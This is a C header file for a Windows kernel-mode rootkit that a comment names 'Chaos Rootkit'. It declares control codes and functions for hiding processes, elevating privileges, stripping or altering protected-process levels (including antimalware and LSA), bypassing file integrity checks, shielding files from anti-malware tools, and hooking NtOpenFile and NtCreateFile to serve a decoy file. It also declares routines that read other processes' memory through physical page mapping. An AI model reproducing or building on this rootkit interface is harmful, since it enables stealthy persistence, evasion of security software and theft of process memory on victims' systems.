#ifndef HEADER_H  
# define HEADER_H  
         

#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>
#include <wdm.h>
#include <fltkernel.h>
#include <ntddk.h>
#include <windef.h>
#include <stdlib.h>

#define HIDE_PROC                               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x45,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PRIVILEGE_ELEVATION                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_SYSTEM                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x91,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x92,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x93,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x94,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB_LIGHT           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x95,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS_LIGHT          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x96,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_LSA_LIGHT              CTL_CODE(FILE_DEVICE_UNKNOWN, 0x97,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x98,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x99,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNPROTECT_ALL_PROCESSES                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x100, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RESTRICT_ACCESS_TO_FILE_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x169, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BYPASS_INTEGRITY_FILE_CTL               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ZWSWAPCERT_CTL                          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define CR_SET_PROTECTION_LEVEL_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x173, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define READ_PROCESS_MEMORY                        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x174, METHOD_BUFFERED, FILE_ANY_ACCESS)


#define STATUS_ALREADY_EXISTS       ((NTSTATUS)0xB7)
#define ERROR_UNSUPPORTED_OFFSET    ((NTSTATUS)0x00000233)

typedef struct _PS_PROTECTION
{
    union
    {
        UCHAR Level;
        struct
        {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION, * PPS_PROTECTION;

/* CR stands for Chaos Rootkit. */
typedef struct _CR_SET_PROTECTION_LEVEL {
    PS_PROTECTION Protection;
    HANDLE Process;
} CR_SET_PROTECTION_LEVEL, *PCR_SET_PROTECTION_LEVEL;

typedef struct foperationx {
    int rpid;
    wchar_t filename[MAX_PATH];
}fopera, * Pfoperation;
#pragma pack(push, 1)
typedef struct foperamemin {
    ULONG rpid;
    uintptr_t address;
    SIZE_T size;
    UCHAR Data[1];      // 变长数据占位符（实际分配更大）
} fopermin, *Pfopermin;
#pragma pack(pop)

typedef struct protection_levels {
    BYTE PS_PROTECTED_SYSTEM;
    BYTE PS_PROTECTED_WINTCB;
    BYTE PS_PROTECTED_WINDOWS;
    BYTE PS_PROTECTED_AUTHENTICODE;
    BYTE PS_PROTECTED_WINTCB_LIGHT;
    BYTE PS_PROTECTED_WINDOWS_LIGHT;
    BYTE PS_PROTECTED_LSA_LIGHT;
    BYTE PS_PROTECTED_ANTIMALWARE_LIGHT;
    BYTE PS_PROTECTED_AUTHENTICODE_LIGHT;
}protection_level, * Pprotection_levels;


typedef struct eprocess_offsets {
    DWORD Token_offset;
    DWORD ActiveProcessLinks_offset;
    DWORD protection_offset;
    DWORD  DirectoryTableBase_offset;
}exprocess_offsets, * peprocess_offsets;


typedef struct x_hooklist {

    BYTE NtOpenFilePatch[12];
    void* NtOpenFileOrigin;
    void* NtOpenFileAddress;
    uintptr_t* NtOpenFileHookAddress;

    BYTE NtCreateFilePatch[12];
    BYTE NtCreateFileOrigin[12];
    void* NtCreateFileAddress;
    uintptr_t* NtCreateFileHookAddress;

    int takeCopy;
    int pID;
    wchar_t filename[MAX_PATH];

    BOOL check_off;
    UNICODE_STRING decoyFile;


}hooklist, * Phooklist;

hooklist            xHooklist;
EX_PUSH_LOCK        pLock;
exprocess_offsets   eoffsets;
protection_level    global_protection_levels;

#define PHYS_ADD_OFFSET(PhysAddr, Offset) \
    ((PHYSICAL_ADDRESS){ .QuadPart = (PhysAddr).QuadPart + (Offset) })

// ---------------------------------------------------------
// 辅助定义
// ---------------------------------------------------------
#define PFN_MASK          0x0000FFFFFFFFF000ULL // 提取物理页帧号的掩码
#define LARGE_PAGE_MASK   0x0000000000000080ULL // Bit 7: Page Size (PS) 位

// ---------------------------------------------------------
// 优化后的辅助宏：只负责 映射 -> 读取 -> 检查存在位
// ---------------------------------------------------------
// 参数说明：
//   CurrentPhys: 当前页表项的物理地址
//   OutEntry:    读取到的页表项值 (输出)
#define READ_ENTRY_AND_CHECK(CurrentPhys, OutEntry) \
    { \
        PVOID _Va = MapPhysicalPage(CurrentPhys, sizeof(ULONG64)); \
        if (!_Va) return 0; \
        OutEntry = *(PULONG64)_Va; \
        UnmapPhysicalPage(_Va, sizeof(ULONG64)); \
        if (!(OutEntry & 1)) return 0; /* Present位为0，表示缺页 */ \
    }

void        IRP_MJCreate();
void        IRP_MJClose();
DWORD       UnprotectAllProcesses();
DWORD       HideProcess(int pid);
DWORD       InitializeOffsets(Phooklist hooklist);
DWORD       PrivilegeElevationForProcess(int pid);
NTSTATUS    ChangeProtectionLevel(PCR_SET_PROTECTION_LEVEL ProtectionLevel);
NTSTATUS    InitializeStructure(Phooklist hooklist_s);
const char* PsGetProcessImageFileName(PEPROCESS Process);
BOOL MDLReadMemory(int pid,
    INT64 address,
    SIZE_T size,
    BYTE* buffer);

ULONG64 GetPhysicalAddress(ULONG64 TargetVAddr, ULONG64 DirBase);
NTSTATUS ReadPhysicalMemory(HANDLE TargetPid, PVOID TargetAddress, SIZE_T READ_SIZE, PVOID Data);
PVOID MapPhysicalPage(ULONG64 PhysicalAddress, SIZE_T Size);
VOID UnmapPhysicalPage(PVOID MappedAddress, SIZE_T Size);

NTSTATUS ReadVirtualMemory_Official(
    _In_ HANDLE TargetPid,
    _In_ PVOID TargetAddress,
    _In_ SIZE_T ReadSize,
    _Out_ PVOID OutputBuffer
);
NTSTATUS KeReadProcessMemory(HANDLE PID, PVOID SourceAddress, PVOID TargetAddress, SIZE_T Size);
#endif
